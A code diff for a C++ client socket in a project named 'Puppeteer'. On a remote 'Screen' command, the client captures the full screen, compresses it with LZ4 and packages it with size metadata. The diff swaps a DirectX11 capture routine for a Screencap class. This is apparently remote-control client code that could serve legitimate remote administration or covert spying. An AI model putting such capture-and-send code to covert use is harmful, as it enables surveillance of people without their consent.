@@ -1,5 +1,4 @@
 #include "PClientSocket.h"
-#include "fstream"
 
 namespace Puppeteer {
 	enum class ActionType {
@@ -42,7 +41,7 @@ namespace Puppeteer {
 		return 1;
 	}
 
-	DirectX11 m_Dx11;
+	Screencap m_Cap(GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN));
 	PCInfo m_PCInfo;
 	bool m_Block;
 
@@ -123,16 +122,16 @@ namespace Puppeteer {
 				continue;
 			}
 			else if (Action.Type == ActionType::Screen) {
-				screenCapture screencp = m_Dx11.getScreen();
+				unsigned char* screenc = m_Cap.CaptureScreen(0,0);
 
-				std::vector<char> compressedResults(LZ4_compressBound(screencp.size));
-				int csize = LZ4_compress_fast((char*)Puppeteer::screenCapSubRes.pData, compressedResults.data(), screencp.size, compressedResults.size(), 1);
+				std::vector<char> compressedResults(LZ4_compressBound(m_Cap.GetSize()));
+				int csize = LZ4_compress_fast((char*)screenc, compressedResults.data(), m_Cap.GetSize(), compressedResults.size(), 1);
 				compressedResults.resize(csize);
 
 				std::map<std::string, int> screen = {
-					{"width", screencp.width},
-					{"height", screencp.height},
-					{"size", screencp.size},
+					{"width", m_Cap.GetWidth()},
+					{"height", m_Cap.GetHeight()},
+					{"size", m_Cap.GetSize()},
 					{"csize", csize}
 				};
 				std::string screendata = WriteJson(screen);
